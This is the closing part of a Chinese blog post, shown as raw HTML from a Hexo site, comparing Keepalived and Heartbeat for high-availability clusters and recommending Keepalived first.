        <h2 id="1-Keepalived使用更简单"><a href="#1-Keepalived使用更简单" class="headerlink" title="1.Keepalived使用更简单"></a>1.Keepalived使用更简单</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从安装、配置、使用、维护等角度上对比，Keepalived都比Heartbeat要简单得多，尤其是Heartbeat 2.1.4后拆分成3个子项目，安装、配置、使用都比较复杂，尤其是出问题的时候，都不知道具体是哪个子系统出问题了；而Keepalived只有1个安装文件、1个配置文件，配置文件也简单很多；</p>
<h2 id="2-Heartbeat功能更强大"><a href="#2-Heartbeat功能更强大" class="headerlink" title="2.Heartbeat功能更强大"></a>2.Heartbeat功能更强大</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Heartbeat虽然复杂，但功能更强大，配套工具更全，<code>适合做大型集群管理</code>，而Keepalived主要用于<code>集群倒换</code>，基本没有管理功能；</p>
<h2 id="3-协议不同"><a href="#3-协议不同" class="headerlink" title="3.协议不同"></a>3.协议不同</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived使用VRRP协议进行通信和选举，Heartbeat使用心跳进行通信和选举；Heartbeat除了走网络外，还可以通过串口通信，貌似更可靠；</p>
<h2 id="4-使用方式基本类似"><a href="#4-使用方式基本类似" class="headerlink" title="4.使用方式基本类似"></a>4.使用方式基本类似</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要基于两者设计高可用方案，最终都要<code>根据业务需要写自定义的脚本</code>，Keepalived的脚本没有任何约束，随便怎么写都可以；Heartbeat的脚本有约束，即要支持service start/stop/restart这种方式，而且Heartbeart提供了很多默认脚本，简单的绑定ip，启动apache等操作都已经有了；</p>
<h2 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<code>优先使用Keepalived</code>，当Keepalived不够用的时候才选择Heartbeat</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HA集群/">HA集群</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/29/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><a class="page-number" href="/page/29/">29</a><span class="page-number current">30</span><a class="page-number" href="/page/31/">31</a><a class="page-number" href="/page/32/">32</a><span class="space">&hellip;</span><a class="page-number" href="/page/63/">63</a><a class="extend next" rel="next" href="/page/31/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2017 失落的乐章
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    

<script>
	var yiliaConfig = {
		fancybox: ,
		mathjax: ,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="/js/main.js"></script>



  </div>
</body>
</html>